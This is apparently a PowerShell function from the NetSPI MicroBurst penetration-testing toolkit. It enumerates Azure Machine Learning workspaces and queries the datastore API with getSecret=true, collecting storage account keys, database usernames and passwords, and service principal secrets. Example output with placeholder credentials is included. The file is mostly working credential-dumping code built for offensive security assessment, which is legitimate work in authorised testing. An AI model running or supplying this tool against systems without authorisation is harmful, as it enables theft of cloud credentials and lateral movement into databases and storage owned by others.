<#
    File: Get-AzMachineLearningCredentials.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2025
    Description: PowerShell function for enumerating sensitive information from Azure Machine Learning (AML) workspaces and their Data Store configurations.
    
    Based on this Talk - "[D24] Smoke and Mirrors: How to hide in Microsoft Azure - Aled Mehta and Christian Philipov" - https://www.youtube.com/watch?v=uvoV75Q7cqU&t=900s
#>

Function Get-AzMachineLearningCredentials
{

<#
    .SYNOPSIS
        Enumerates and dumps available credentials from Azure Machine Learning (AML) workspaces.
    .DESCRIPTION
        This function will look for any available AML workspaces in the subscriptions that you select, and will dump Storage Account Keys, and database connection credentials for any assets configured in the AML workspace Datastores.
    .PARAMETER Subscription
        Subscription to use.
    .EXAMPLE
        PS C:\MicroBurst> Get-AzMachineLearningCredentials -Verbose | ft 
        VERBOSE: Logged In as kfosaaen@notatenant.com
        VERBOSE: Enumerating Azure Machine Learning Workspaces in the "TestEnvironment" Subscription
        VERBOSE: 	Enumerating Credentials in the netspi Workspace
        VERBOSE: 		Default Workspace Found
        VERBOSE: 		Data Stores Found
        VERBOSE: Completed Azure Machine Learning data collection against the "TestEnvironment" Subscription

        CredentialService StorageAccount      Container                         Key             Server         Database   CredentialType    Username                             Password         TenantID
        ----------------- --------------      ---------                         ---             ------         --------   --------------    --------                             --------         --------
        AzureSQLDatabase  NA                  NA                                NA              netspitest1    2023tester SqlAuthentication sqluser                              sqlpass          NA
        AzureSQLDatabase  NA                  NA                                NA              netspi-test    sqli-test  ServicePrincipal  d569d700-b1e4-4ec3-a5a1-cbdc9e8a3138 123456789SECRET  72f988bf-86f1-41af-91ab-2d7cd011db47
        MySQLDatabase     NA                  NA                                NA              mysqlnetspi    mysqldb    SqlAuthentication mysqluser                            mysqlpass        NA
        PGSQLDatabase     NA                  NA                                NA              pgsqlnetspi    pgsql      SqlAuthentication pgsqluser                            pgsqlpassword    NA
        DatalakeGen1      NA                  NA                                NA              netspidatalake NA         ServicePrincipal  06e55f93-fa46-4dbd-bd9a-67489e2ac955 testsecret       72f988bf-86f1-41af-91ab-2d7cd011db47
        DatalakeGen2      datalakegen2netspi  testcontainer                     NA              NA             NA         NA                06e55f93-fa46-4dbd-bd9a-67489e2ac955 testsecret       72f988bf-86f1-41af-91ab-2d7cd011db47
        StorageAccount    karldrivenetspi     clouddrive                        sv=[REDACTED]   NA             NA         NA                NA                                   NA               NA
        StorageAccount    netspi4167214255    code-391[Truncated]b6             P[REDACTED]=    NA             NA         NA                NA                                   NA               NA
        StorageAccount    netspi4167214255    testml                            P[REDACTED]=    NA             NA         NA                NA                                   NA               NA
        StorageAccount    netspi4167214255    testml-blobstore-75f[Truncated]d6 P[REDACTED]=    NA             NA         NA                NA                                   NA               NA
        StorageAccount    netspi4167214255    testml-filestore-75f[Truncated]d6 P[REDACTED]=    NA             NA         NA                NA                                   NA               NA
        StorageAccount    netspi4167214255    testml-blobstore-75f[Truncated]d6 P[REDACTED]=    NA             NA         NA                NA                                   NA               NA    
    .LINK
        https://github.com/NetSPI/MicroBurst
        https://www.youtube.com/watch?v=uvoV75Q7cqU&t=900s
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = ""
    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
   
    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | Out-GridView -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Get-AzMachineLearningCredentials -Subscription $sub}
        return
    }

    $SubInfo = Get-AzSubscription -SubscriptionId $Subscription
    
    Write-Verbose "Logged In as $accountName"
    Write-Verbose "Enumerating Azure Machine Learning Workspaces in the `"$($SubInfo.Name)`" Subscription"

    # Create data table to house credentials
    $TempTblCreds = New-Object System.Data.DataTable 
    $TempTblCreds.Columns.Add("CredentialService") | Out-Null
    $TempTblCreds.Columns.Add("StorageAccount") | Out-Null
    $TempTblCreds.Columns.Add("Container") | Out-Null
    $TempTblCreds.Columns.Add("Key") | Out-Null
    $TempTblCreds.Columns.Add("Server") | Out-Null
    $TempTblCreds.Columns.Add("Database") | Out-Null
    $TempTblCreds.Columns.Add("CredentialType") | Out-Null
    $TempTblCreds.Columns.Add("Username") | Out-Null
    $TempTblCreds.Columns.Add("Password") | Out-Null
    $TempTblCreds.Columns.Add("TenantID") | Out-Null

    # Find All the AML Resources
    $workspaces = Get-AzResource -ResourceType Microsoft.MachineLearningServices/workspaces
    
    $AccessToken = Get-AzAccessToken
    if ($AccessToken.Token -is [System.Security.SecureString]) {
        $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
        try {
            $Token = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
        } finally {
            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
        }
    } else {
        $Token = $AccessToken.Token
    }

    $workspaces | ForEach-Object{
        
        Write-Verbose "`tEnumerating Credentials in the $($_.Name) Workspace"
        
        # Try to get the Default Datastore
        try{
            $defaultObj = (Invoke-WebRequest -ErrorAction SilentlyContinue -Verbose:$false -Uri (-join("https://ml.azure.com/api/",$_.Location,"/datastore/v1.0",$_.ResourceId,"/default")) -Headers @{ Authorization ="Bearer $token"}).Content | ConvertFrom-Json
            Write-Verbose "`t`tDefault Workspace Found"
            $TempTblCreds.Rows.Add("StorageAccount",$defaultObj.azureStorageSection.accountName,$defaultObj.azureStorageSection.containerName,$defaultObj.azureStorageSection.credential,"NA","NA","NA","NA","NA","NA") | Out-Null
        }
        catch{Write-Verbose "`t`tNo Default Workspace Found"}


        # Try to get the datastore secrets
        try{
            $dataStoreObjBase = Invoke-WebRequest -ErrorAction SilentlyContinue -Verbose:$false -Uri (-join("https://ml.azure.com/api/",$_.Location,"/datastore/v1.0",$_.ResourceId,"/datastores/?getSecret=true")) -Headers @{ Authorization ="Bearer $token"}
            $dataStoreObj = $dataStoreObjBase.Content | ConvertFrom-Json
        }
        catch{Write-Verbose "`t`tNo Data Stores Found"}
        
        # If the data stores endpoint returns "{"value": []}", then there are no data stores
        if ($dataStoreObjBase.RawContentLength -eq 17){Write-Verbose "`t`tNo Data Stores Found"}
        else{
            Write-Verbose "`t`tData Stores Found"
            $dataStoreObj | ForEach-Object{
                $_.value | ForEach-Object{
                    # Extract SQL Auth Creds
                    if($null -ne $_.azureSqlDatabaseSection){
                        if($_.azureSqlDatabaseSection.credentialType -eq "SqlAuthentication"){
                           $TempTblCreds.Rows.Add("AzureSQLDatabase","NA","NA","NA",$_.azureSqlDatabaseSection.serverName,$_.azureSqlDatabaseSection.databaseName,"SqlAuthentication",$_.azureSqlDatabaseSection.userId,$_.azureSqlDatabaseSection.userPassword,"NA") | Out-Null
                        }
                        elseif($_.azureSqlDatabaseSection.credentialType -eq "ServicePrincipal"){
                           $TempTblCreds.Rows.Add("AzureSQLDatabase","NA","NA","NA",$_.azureSqlDatabaseSection.serverName,$_.azureSqlDatabaseSection.databaseName,"ServicePrincipal",$_.azureSqlDatabaseSection.clientId,$_.azureSqlDatabaseSection.clientSecret,$_.azureSqlDatabaseSection.tenantId) | Out-Null
                        }
                    }
                    # Extract MySQL Auth Creds
                    if($null -ne $_.azureMySqlSection){
                        $TempTblCreds.Rows.Add("MySQLDatabase","NA","NA","NA",$_.azureMySqlSection.serverName,$_.azureMySqlSection.databaseName,"SqlAuthentication",$_.azureMySqlSection.userId,$_.azureMySqlSection.userPassword,"NA") | Out-Null
                    }
                    # Extract PGSQL Auth Creds
                    if($null -ne $_.azurePostgreSqlSection){
                        $TempTblCreds.Rows.Add("PGSQLDatabase","NA","NA","NA",$_.azurePostgreSqlSection.serverName,$_.azurePostgreSqlSection.databaseName,"SqlAuthentication",$_.azurePostgreSqlSection.userId,$_.azurePostgreSqlSection.userPassword,"NA") | Out-Null
                    }
                    # Extract DatalakeGen1 Auth Creds
                    if($null -ne $_.azureDataLakeSection){
                        $TempTblCreds.Rows.Add("DatalakeGen1","NA","NA","NA",$_.azureDataLakeSection.storeName,"NA","ServicePrincipal",$_.azureDataLakeSection.clientId,$_.azureDataLakeSection.clientSecret,$_.azureDataLakeSection.tenantId) | Out-Null
                    }
                    # Extract Storage Account Creds
                    elseif($null -ne $_.azureStorageSection){
                        # Extract DatalakeGen2 Auth Creds
                        if($null -ne $_.azureStorageSection.clientCredentials){
                            $TempTblCreds.Rows.Add("DatalakeGen2",$_.azureStorageSection.accountName,$_.azureStorageSection.containerName,"NA","NA","NA","ServicePrincipal",$_.azureStorageSection.clientCredentials.clientId,$_.azureStorageSection.clientCredentials.clientSecret,$_.azureStorageSection.clientCredentials.tenantId) | Out-Null
                        }
                        else{
                            $TempTblCreds.Rows.Add("StorageAccount",$_.azureStorageSection.accountName,$_.azureStorageSection.containerName,$_.azureStorageSection.credential,"NA","NA","NA","NA","NA","NA") | Out-Null
                        }
                    }
                }
            }
        }
    }

    Write-Verbose "Completed Azure Machine Learning data collection against the `"$($SubInfo.Name)`" Subscription"
    
    Write-Output $TempTblCreds
}